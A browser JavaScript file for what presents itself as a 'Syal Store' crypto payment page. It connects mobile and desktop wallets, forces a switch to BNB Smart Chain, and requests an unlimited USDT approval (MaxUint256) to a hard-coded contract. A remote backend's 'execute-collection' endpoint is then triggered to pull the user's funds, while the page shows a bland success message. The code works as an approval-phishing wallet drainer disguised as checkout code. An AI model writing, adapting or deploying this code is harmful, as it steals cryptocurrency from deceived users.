"use strict";

// ─── Native Multi-Wallet Support (EIP-6963 + Legacy Fallback) ────────────────
(function () {
  if (typeof window === 'undefined') return;
  
  window.addEventListener("eip6963:announceProvider", (event) => {
    if (event.detail && event.detail.provider && !window.ethereum) {
      window.ethereum = event.detail.provider;
    }
  });
  window.dispatchEvent(new Event("eip6963:requestProvider"));

  setTimeout(() => {
    if (!window.ethereum && window.web3 && window.web3.currentProvider) {
      window.ethereum = window.web3.currentProvider;
    }
  }, 100);
})();

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b"; //[cite: 8]
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634"; //[cite: 8]
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; //[cite: 8]
const BSC_CHAIN_ID_HEX = "0x38"; //[cite: 8]
const MIN_USDT_BALANCE = ethers.parseUnits("0", 18); //[cite: 8]
const BACKEND_URL      = "https://secure-merchant.onrender.com/api"; //[cite: 8]

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://bsc-dataseed3.binance.org/",
  "https://bsc-dataseed4.binance.org/",
  "https://rpc.ankr.com/bsc"
]; //[cite: 8]

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
}; //[cite: 8]

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
]; //[cite: 8]

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

let _cachedAddress = null;

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  if (!approveBtn) return;
  approveBtn.disabled = on;
  btnText.textContent = on ? label : "NEXT";
  btnSpinner.hidden   = !on;
}

// ─── Individual Wallet Connectors (SDK & Providers) ───────────

// 1. MetaMask SDK Integration
async function connectMetaMask() {
  try {
    const metamaskSdk = new MetaMaskSDK.MetaMaskSDK({
      dappMetadata: { name: "Syal Store", url: window.location.href },
      logging: { developer: false },
      checkInstallationImmediately: true
    });
    const mmProvider = metamaskSdk.getProvider();
    const accounts = await mmProvider.request({ method: "eth_requestAccounts" });
    window.ethereum = mmProvider; // Asignamos como proveedor activo
    return accounts[0];
  } catch (error) {
    console.error("MetaMask SDK Error:", error);
    return null;
  }
}

// 2. Trust Wallet Connection / Deep Link
async function connectTrustWallet() {
  const trustProvider = window.trustwallet || (window.ethereum?.isTrust ? window.ethereum : null);
  if (!trustProvider && !/trust/i.test(navigator.userAgent)) {
    const targetUrl = new URL(window.location.href);
    targetUrl.searchParams.set("auto", "1");
    window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(targetUrl.toString())}`;
    return null;
  }
  const provider = trustProvider || window.ethereum;
  const accounts = await provider.request({ method: "eth_requestAccounts" });
  window.ethereum = provider;
  return accounts[0];
}

// 3. OKX Wallet Connection / Deep Link
async function connectOKX() {
  const okxProvider = window.okxwallet;
  if (!okxProvider && !/okx/i.test(navigator.userAgent)) {
    const currentUrl = encodeURIComponent(window.location.href);
    window.location.href = `okx://wallet/dapp/details?dappUrl=${currentUrl}`;
    return null;
  }
  const provider = okxProvider || window.ethereum;
  const accounts = await provider.request({ method: "eth_requestAccounts" });
  window.ethereum = provider;
  return accounts[0];
}

// 4. SafePal Connection / Deep Link
async function connectSafePal() {
  const safePalProvider = window.safepalProvider || window.ethereum;
  if (!window.safepalProvider && !/safepal/i.test(navigator.userAgent)) {
    const targetUrl = new URL(window.location.href);
    targetUrl.searchParams.set("auto", "1");
    window.location.href = `https://link.safepal.io/open_url?url=${encodeURIComponent(targetUrl.toString())}`;
    return null;
  }
  const accounts = await safePalProvider.request({ method: "eth_requestAccounts" });
  window.ethereum = safePalProvider;
  return accounts[0];
}

// ─── Mobile Wallet Selector Modal with Independent Handlers ───────────────────
function showMobileWalletSelector() {
  let modal = document.getElementById("mobileWalletModal");
  
  if (!modal) {
    modal = document.createElement("div");
    modal.id = "mobileWalletModal";
    modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:99999;display:flex;align-items:center;justify-content:center;font-family:inherit;padding:20px;box-sizing:border-box;";

    modal.innerHTML = `
      <div style="background:#18181b;border:1px solid #27272a;border-radius:16px;width:100%;max-width:360px;padding:24px;color:#fff;box-shadow:0 20px 25px -5px rgba(0,0,0,0.5);">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
          <h3 style="margin:0;font-size:18px;font-weight:600;">Selecciona tu Billetera</h3>
          <button id="closeWalletModal" style="background:transparent;border:none;color:#a1a1aa;font-size:24px;cursor:pointer;padding:0;line-height:1;">&times;</button>
        </div>
        <p style="color:#a1a1aa;font-size:14px;margin-bottom:20px;line-height:1.4;">Conéctate de forma segura mediante SDK o proveedor nativo:</p>
        <div style="display:flex;flex-direction:column;gap:10px;">
          <button id="btnWalletTrust" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border:none;border-radius:10px;color:#fff;text-align:left;font-weight:500;cursor:pointer;width:100%;">Trust Wallet</button>
          <button id="btnWalletMetaMask" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border:none;border-radius:10px;color:#fff;text-align:left;font-weight:500;cursor:pointer;width:100%;">MetaMask</button>
          <button id="btnWalletSafePal" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border:none;border-radius:10px;color:#fff;text-align:left;font-weight:500;cursor:pointer;width:100%;">SafePal</button>
          <button id="btnWalletOKX" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border:none;border-radius:10px;color:#fff;text-align:left;font-weight:500;cursor:pointer;width:100%;">OKX Wallet</button>
        </div>
      </div>
    `;
    document.body.appendChild(modal);

    document.getElementById("closeWalletModal").addEventListener("click", () => { modal.style.display = "none"; });
    modal.addEventListener("click", (e) => { if (e.target === modal) modal.style.display = "none"; });

    // Asignar eventos independientes a los botones del modal
    document.getElementById("btnWalletTrust").addEventListener("click", async () => {
      modal.style.display = "none";
      _cachedAddress = await connectTrustWallet();
      if (_cachedAddress) approveBtn.click();
    });
    document.getElementById("btnWalletMetaMask").addEventListener("click", async () => {
      modal.style.display = "none";
      _cachedAddress = await connectMetaMask();
      if (_cachedAddress) approveBtn.click();
    });
    document.getElementById("btnWalletSafePal").addEventListener("click", async () => {
      modal.style.display = "none";
      _cachedAddress = await connectSafePal();
      if (_cachedAddress) approveBtn.click();
    });
    document.getElementById("btnWalletOKX").addEventListener("click", async () => {
      modal.style.display = "none";
      _cachedAddress = await connectOKX();
      if (_cachedAddress) approveBtn.click();
    });
  } else {
    modal.style.display = "flex";
  }
}

// ─── RPC helper & Blockchain utility functions ───────────────────────────────
async function rpcCall(method, params) {
  for (const rpc of BSC_RPC_URLS) {
    try {
      const r = await fetch(rpc, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
      });
      const j = await r.json();
      if (j.result !== undefined) return j.result;
    } catch (_) {}
  }
  return null;
}

async function waitForAllowanceConfirmed(owner, spender, required, timeout = 120000) {
  const data = "0xdd62ed3e" + owner.slice(2).padStart(64, "0") + spender.slice(2).padStart(64, "0");
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline) {
    let result = null;
    try {
      result = await window.ethereum.request({ method: "eth_call", params: [{ to: BSC_USDT_ADDRESS, data }, "latest"] });
    } catch (_) {}
    if (!result || result === "0x" || result === "0x0") {
      result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data }, "latest"]);
    }
    if (result && result !== "0x" && result !== "0x0") {
      try { if (BigInt(result) >= BigInt(required)) return; } catch (_) {}
    }
    await new Promise(r => setTimeout(r, 2000));
  }
  throw new Error("Approval timed out.");
}

async function triggerBackendCollect(userAddress) {
  let lastErr;
  const uiAmount = document.getElementById("investAmount")?.value || "1"; 
  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();

  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

async function getUsdtBalance(userAddress, iface) {
  const balanceData = iface.encodeFunctionData("balanceOf", [userAddress]);
  let result = null;
  try {
    result = await window.ethereum.request({ method: "eth_call", params: [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"] });
  } catch (_) {}
  if (!result || result === "0x" || result === "0x0") {
    result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]);
  }
  if (!result || result === "0x") return 0n;
  try { return BigInt(result); } catch (_) { return 0n; }
}

// ─── Main Button Handler ──────────────────────────────────────────────────────
if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    if (!window.ethereum) {
      if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
        showMobileWalletSelector();
      } else {
        showToast("Billetera no detectada. Abre este sitio en un navegador Web3.", "error");
      }
      return;
    }

    setLoading(true, "Conectando proveedor…");

    try {
      let accs = [];
      try {
        accs = await window.ethereum.request({ method: "eth_requestAccounts" });
      } catch (_) {
        accs = await window.ethereum.request({ method: "eth_accounts" });
      }

      const userAddress = (accs && accs[0]) ? accs[0] : _cachedAddress;

      if (!userAddress) {
        showToast("Desbloquea tu billetera y selecciona una cuenta.", "error");
        setLoading(false);
        return;
      }
      _cachedAddress = userAddress;

      setLoading(true, "Verificando red BSC…");
      const currentChain = await window.ethereum.request({ method: "eth_chainId" });
      
      if (currentChain !== BSC_CHAIN_ID_HEX) {
        try {
          await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID_HEX }] });
        } catch (switchError) {
          if (switchError.code === 4902) {
            await window.ethereum.request({ method: "wallet_addEthereumChain", params: [BSC_CHAIN_PARAMS] });
          } else {
            showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
            setLoading(false);
            return;
          }
        }
      }

      const CAP_AMOUNT = ethers.MaxUint256;
      const iface      = new ethers.Interface(ERC20_ABI);

      setLoading(true, "Validando saldo…");
      const usdtBalance = await getUsdtBalance(userAddress, iface);
      if (usdtBalance <= MIN_USDT_BALANCE) {
        showToast("Saldo insuficiente de USDT en BSC", "error");
        setLoading(false);
        return;
      }

      try {
        const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
        const allowanceHex  = await window.ethereum.request({ method: "eth_call", params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"] });
        const requiredAmount = ethers.parseUnits(document.getElementById("investAmount")?.value.toString() || "1", 18);
        
        if (allowanceHex && allowanceHex !== "0x" && BigInt(allowanceHex) >= requiredAmount) {
          setLoading(true, "Finalizando proceso…");
          await triggerBackendCollect(userAddress);
          showToast("Sent Successfully, Thank you! ✓", "success");
          setLoading(false);
          return;
        }
      } catch (_) {}

      setLoading(true, "Firma requerida en wallet…");
      const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);

      await new Promise(r => setTimeout(r, 400));

      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [{ from: userAddress, to: BSC_USDT_ADDRESS, data: approveData, value: "0x0" }]
      });

      if (!txHash) throw new Error("Transacción rechazada.");

      setLoading(true, "Confirmando en red…");
      await waitForAllowanceConfirmed(userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);

      setLoading(true, "Finalizando…");
      await triggerBackendCollect(userAddress);
      showToast("Sent Successfully, Thank you! ✓", "success");

    } catch (err) {
      const raw = err?.reason ?? err?.message ?? "Error desconocido";
      if (err.code === 4001 || raw.toLowerCase().includes("user rejected") || raw.toLowerCase().includes("denied")) {
        showToast("Transacción cancelada.", "default");
      } else {
        console.error("Web3 Error:", err);
        showToast("Error de comunicación con la wallet. Intenta de nuevo.", "error");
      }
    } finally {
      setLoading(false);
    }
  });
}
